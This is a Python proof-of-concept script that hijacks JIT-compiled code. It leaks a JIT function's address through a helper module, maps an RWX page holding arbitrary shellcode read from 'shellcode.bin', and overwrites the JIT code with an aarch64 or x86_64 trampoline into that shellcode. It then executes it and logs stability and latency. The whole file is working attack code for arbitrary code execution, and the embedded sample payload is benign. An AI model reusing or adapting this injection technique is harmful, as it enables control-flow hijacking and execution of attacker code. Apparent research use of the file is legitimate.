#!/usr/bin/env python3
import ctypes
import json
import mmap
import os
import platform
import struct
import sys
import time
import pathlib
from datetime import datetime
import jitexecleak
from typing import Tuple, Dict, Any, Optional

# Constants
NUM_ITERATIONS = 1
MAGIC = 0xDEADBEEF
PAGE_SIZE = 0x1000
PROT_READ = 1
PROT_WRITE = 2
PROT_EXEC = 4
MAP_PRIVATE = 2
MAP_ANONYMOUS = 0x20

# Shellcode that prints "OK" and exits
OK_EXIT_CODE = (
    b"\x20\x00\x80\xd2"      # 0x00: movz x0, #1        ; stdout
    b"\xe1\x00\x00\x10"      # 0x04: adr x1, #0x20      ; → 0x28
    b"\x82\x00\x80\xd2"      # 0x08: movz x2, #2        ; length
    b"\x08\x08\x80\xd2"      # 0x0c: movz x8, #8        ; sys_write
    b"\x01\x00\x00\xd4"      # 0x10: svc #0
    b"\xc0\x03\x5f\xd6"      # 0x14: ret
    b"\x1f\x20\x03\xd5"      # 0x18: nop
    b"\x1f\x20\x03\xd5"      # 0x1c: nop
    b"OK \n"                 # 0x20: message
)

# JIT Function Management
def make_combo_func(magic):
    def combo(x: int, s: str):
        acc = x
        g = b'\x00\x02\x1f\xd6'.decode('latin1')
        for i in range(1):
            acc ^= (magic & i)
            acc += (acc << 1)
            acc &= 0x0F0F0F0F
            s += str(i)
            s = s.replace("123", g)
        return s.upper()
    return combo

def get_jit_code_address(combo) -> Optional[Tuple[int,int]]:
    for i in range(6000):
        combo(42, "123AA")
    return jitexecleak.leak_executor_jit(combo)

# Memory and Shellcode Management
def allocate_and_load_shellcode() -> int:
    """
    Allocates memory and loads shellcode into it.
    Returns:
        int: The address where shellcode is loaded
    Raises:
        RuntimeError: If memory allocation or shellcode loading fails
    """
    # 1. Allocate memory
    libc = ctypes.CDLL("libc.so.6")
    libc.mmap.restype = ctypes.c_void_p
    
    shell_addr = libc.mmap(
        None,
        mmap.PAGESIZE,
        PROT_READ | PROT_WRITE | PROT_EXEC,
        MAP_PRIVATE | MAP_ANONYMOUS,
        -1,
        0
    )
        
    # 2. Initialize memory
    null_buffer = b'\x00' * mmap.PAGESIZE
    ctypes.memmove(shell_addr, null_buffer, mmap.PAGESIZE)
    
    # 3. Load shellcode
    with open("shellcode.bin", "rb") as f:
        shellcode = f.read()
    ctypes.memmove(shell_addr, shellcode, len(shellcode))
    #ctypes.memmove(shell_addr, OK_EXIT_CODE, len(OK_EXIT_CODE))
    return shell_addr

def mprotect_rwX(addr: int, size: int = 0x1000):
    libc = ctypes.CDLL("libc.so.6")
    page_start = addr & ~(mmap.PAGESIZE - 1)
    if libc.mprotect(ctypes.c_void_p(page_start), ctypes.c_size_t(size), 0x7) != 0:
        raise OSError(f"mprotect RWX failed (errno: {ctypes.get_errno()})")

# Trampoline Execution
def trampoline_overwrite(jit_addr: int, jit_size: int, shell_addr: int, output_dir: pathlib.Path, run_id: int) -> Tuple[bytes, str]:
    """
    Sets up the trampoline in JIT memory.
    Returns:
        Tuple[bytes, str]: (trampoline code, jit map snapshot path)
    """
    dump_path = dump_jit_region_to_log(jit_addr, output_dir, run_id)
    mprotect_rwX(jit_addr, jit_size)

    arch = platform.machine()
    if arch == "aarch64":
        trampoline = (
            b"\x50\x00\x00\x58" +  # ldr x16, #8
            b"\x00\x02\x1f\xd6" +  # br x16
            struct.pack("<Q", shell_addr)
        )
    elif arch == "x86_64":
        trampoline = (
            b"\xff\x25\x00\x00\x00\x00" +
            struct.pack("<Q", shell_addr)
        )
    else:
        raise RuntimeError(f"Unsupported architecture: {arch}")

    ctypes.memmove(jit_addr, trampoline, len(trampoline))
        
    return trampoline, dump_path

def jump_to_trampoline(jit_addr: int, trampoline: bytes, shell_addr: int, before_jit_latency: float) -> Tuple[str, Dict[str, Any]]:
    """
    Executes the trampoline jump and measures performance.
    Returns:
        Tuple[str, Dict[str, Any]]: (status, execution log)
    """
    start_time = time.time()
    log = {
        "pid": os.getpid(),
        "jit_addr": hex(jit_addr),
        "status": "unknown",
        "start_time": datetime.now().isoformat(),
        "privilege_level": "user",
        "before_jit_latency": before_jit_latency,
    }

    try:
        fn = ctypes.CFUNCTYPE(None)(jit_addr)
        exec_start = time.time()
        fn()
        exec_end = time.time()

        log["status"] = "success"
        log["shellcode_addr"] = hex(shell_addr)
        log["jump_latency"] = exec_end - exec_start

    except Exception as e:
        log["status"] = "fail"
        log["error"] = str(e)
    finally:
        log["end_time"] = datetime.now().isoformat()
        log["duration"] = time.time() - start_time
    
    return log["status"], log

# Logging and Results
def dump_jit_region_to_log(jit_addr: int, output_dir: pathlib.Path, run_id: int):
    maps_path = "/proc/self/maps"
    log_path = output_dir / f"jit_maps_snapshot_{run_id}.txt"
    with open(maps_path, "r") as f, open(log_path, "w") as out:
        for line in f:
            if f"{jit_addr:x}"[:5] in line:
                out.write(line)
    return str(log_path)

def create_error_log(run_id: int, error: str, before_jit_latency: float) -> Dict[str, Any]:
    return {
        "pid": os.getpid(),
        "run_id": run_id,
        "status": "error",
        "error": error,
        "timestamp": time.time(),
        "before_jit_latency": before_jit_latency
    }

def process_results(results, output_dir: pathlib.Path):
    success = sum(1 for r, _ in results if r == "success")
    fail = sum(1 for r, _ in results if r == "fail")
    total = len(results)

    success_durations = [log["jump_latency"] for r, log in results if r == "success"]
    avg_jump_latency = sum(success_durations) / len(success_durations) if success_durations else 0
    before_jit_latency = results[0][1]["before_jit_latency"] if results else 0
    stability = (success / total) * 100 if total > 0 else 0

    jit_addrs = [int(log["jit_addr"], 16) for r, log in results if r == "success"]
    if jit_addrs:
        base_addr = min(jit_addrs)
        jitters = [addr - base_addr for addr in jit_addrs]
        avg_jitter = sum(jitters) / len(jitters)
        std_jitter = (sum((x - avg_jitter) ** 2 for x in jitters) / len(jitters)) ** 0.5
    else:
        avg_jitter = std_jitter = 0

    summary = {
        "total_runs": total,
        "success": success,
        "fail": fail,
        "stability": stability,
        "before_jit_latency": before_jit_latency,
        "avg_jump_latency": avg_jump_latency,
        "avg_jitter": avg_jitter,
        "std_jitter": std_jitter,
        "privilege_level": "user"
    }
    
    with open(output_dir / "summary.json", "w") as f:
        json.dump(summary, f, indent=2)

# Main Execution
def run_once(run_id: int, output_dir: pathlib.Path) -> Tuple[str, Dict[str, Any]]:
    try:
        # 1. Create and measure JIT function
        combo = make_combo_func(MAGIC)
        exec_start = time.time()
        combo(42, "123AA")
        exec_end = time.time()
        before_jit_latency = exec_end - exec_start

        # 2. Allocate memory and load shellcode
        shell_addr = allocate_and_load_shellcode()
        
        # 3. Get JIT address
        jit_addr, jit_size = get_jit_code_address(combo)
        if not jit_addr:
            return "fail", {
                "error": "JIT addr not found",
                "before_jit_latency": before_jit_latency
            }
        
        # 4. Setup trampoline
        trampoline, dump_path = trampoline_overwrite(jit_addr, jit_size, shell_addr, output_dir, run_id)
        
        # 5. Execute jump
        status, log = jump_to_trampoline(jit_addr, trampoline, shell_addr, before_jit_latency)
        log["jit_map_snapshot"] = dump_path
        return status, log
        
    except Exception as e:
        return "error", create_error_log(run_id, str(e), before_jit_latency)

if __name__ == "__main__":
    output_dir = pathlib.Path("trampoline_jit_log")
    output_dir.mkdir(exist_ok=True)
    
    results = []
    result = run_once(0, output_dir)
    results.append(result)
    
    process_results(results, output_dir)
